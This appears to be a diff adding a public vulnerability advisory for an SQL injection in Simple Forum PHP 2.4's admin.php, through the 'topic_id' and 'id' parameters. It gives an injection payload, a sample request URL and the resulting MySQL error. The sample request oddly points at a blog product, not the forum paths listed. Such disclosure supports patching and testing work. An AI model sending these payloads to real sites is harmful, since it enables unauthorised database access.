@@ -1,0 +1,30 @@
+=====================================================
+# Simple Forum PHP 2.4 - SQL Injection
+=====================================================
+# Vendor Homepage: http://simpleforumphp.com
+# Date: 14 Oct 2016
+# Demo Link : http://simpleforumphp.com/forum/admin.php
+# Version : 2.4
+# Platform : WebApp - PHP
+# Author: Ashiyane Digital Security Team
+# Contact: hehsan979@gmail.com
+=====================================================
+# PoC:
+Vulnerable Url:
+http://localhost/forum/admin.php?act=replies&topic_id=[payload]
+http://localhost/forum/admin.php?act=editTopic&id=[payload]
+Vulnerable parameter : topic_id , id
+Mehod : GET
+
+A simple inject :
+Payload : '+order+by+100--+
+http://simpleblogphp.com/blog/admin.php?act=editPost&id=1'+order+by+999--+
+
+In response can see result :
+Could not execute MySQL query: SELECT * FROM demo_forum_topics WHERE
+id='' order by 100-- ' . Error: Unknown column '100' in 'order clause'
+
+Result of payload: Error: Unknown column '100' in 'order clause'
+=====================================================
+# Discovered By : Ehsan Hosseini
+=====================================================
